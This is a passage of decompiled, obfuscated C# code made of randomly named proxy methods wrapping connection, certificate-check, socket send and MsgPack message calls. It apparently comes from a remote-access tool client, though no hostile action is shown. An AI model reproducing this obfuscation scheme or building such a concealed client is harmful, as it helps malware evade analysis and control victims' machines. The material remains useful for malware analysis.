	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool fwyhst9ibOicMlaPGr()
	{
		return EBZ0vlKh127YE41b8l == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static Connection UC4Uj67LifCJMXPHfh()
	{
		return EBZ0vlKh127YE41b8l;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object uD3PIQ4FnuQTFylDS2()
	{
		return ServerCertificate;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool Rr4BtxfAvsNArt8Oog(object P_0, object P_1, object P_2)
	{
		return APrifndOkXLf6O9iex.UXKaDWyvn(P_0, (X509Certificate)P_1, (APrifndOkXLf6O9iex)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object b8rBvnUZ5xcDrlFn2Z()
	{
		return Tick;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void jw0D4mDr6SOPgvxBRK(object P_0, object P_1)
	{
		rw5tcZVJaEkNI8B1Xd.UXKaDWyvn(P_0, (rw5tcZVJaEkNI8B1Xd)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool sWEZLMgIS99OYqWDb9(object P_0, object P_1)
	{
		return Ui7lqPXfQCYFUnFcaY.UXKaDWyvn(P_0, (Ui7lqPXfQCYFUnFcaY)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool dvKfbgFUjxu5bBF8fs()
	{
		return IsConnected;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static long ctsbKCLYgJMt8wDWuO()
	{
		return Offset;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int AOc1hCjcpW7H2Hn9qu(object P_0, object P_1, int P_2, int P_3, object P_4)
	{
		return A6kNklrEFJHXMgRquE.UXKaDWyvn(P_0, (byte[])P_1, P_2, P_3, (A6kNklrEFJHXMgRquE)P_4);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void xwenNuEAWViSNfdV7p(object P_0, object P_1, object P_2)
	{
		dPGWyBvh9ZZ1motMaa.UXKaDWyvn(P_0, P_1, (dPGWyBvh9ZZ1motMaa)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object hRxPbOtE9OZ3JAvBUk(object P_0, object P_1, int P_2, int P_3, object P_4, object P_5, object P_6)
	{
		return EH6tnS8M0lRNQdS4bT.UXKaDWyvn(P_0, (byte[])P_1, P_2, P_3, (AsyncCallback)P_4, P_5, (EH6tnS8M0lRNQdS4bT)P_6);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object b6MQB1ximmwlJ1DChE(int P_0, object P_1)
	{
		return Ee9a1uhHn2GctWJDsm.UXKaDWyvn(P_0, (Ee9a1uhHn2GctWJDsm)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool qOOOSoOhy7KXjpO2rk(object P_0, int P_1, SelectMode P_2, object P_3)
	{
		return AWUfbsgbPbiqqAK2JI.UXKaDWyvn(P_0, P_1, P_2, (AWUfbsgbPbiqqAK2JI)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void VQk59f0X7Q1XA8HXec(object P_0, object P_1, int P_2, int P_3, object P_4)
	{
		NrSUCvBnrsCvCySv28.UXKaDWyvn(P_0, (byte[])P_1, P_2, P_3, (NrSUCvBnrsCvCySv28)P_4);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void HrEpPH1r20RlbpYOyv(object P_0, long P_1, object P_2)
	{
		VMIavUShyfAK7jTNOG.UXKaDWyvn(P_0, P_1, (VMIavUShyfAK7jTNOG)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void V5oPk1IivL44y9oknB(object P_0, object P_1)
	{
		xeyUgBcASKDwoPHPqg.UXKaDWyvn(P_0, (xeyUgBcASKDwoPHPqg)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object gfDV2oCRVbdQw7qs0h(object P_0, object P_1)
	{
		return ((MsgPack)P_0).ForcePathObject((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object XqSqilpTOS6Q83sPBh(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void XMemSEVFkn9tKno7ys(object P_0)
	{
		Send((byte[])P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void x5O3JZknR8Io0GAdnn(object P_0)
	{
		bBmXb7EBty0gQq3Dng.UXKaDWyvn((bBmXb7EBty0gQq3Dng)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void jLXUR5GDBrQZSTFHS3()
	{
		WkMgYHbfSUMGdoITRx.UaxVEsuzWFTQk();
	}
}
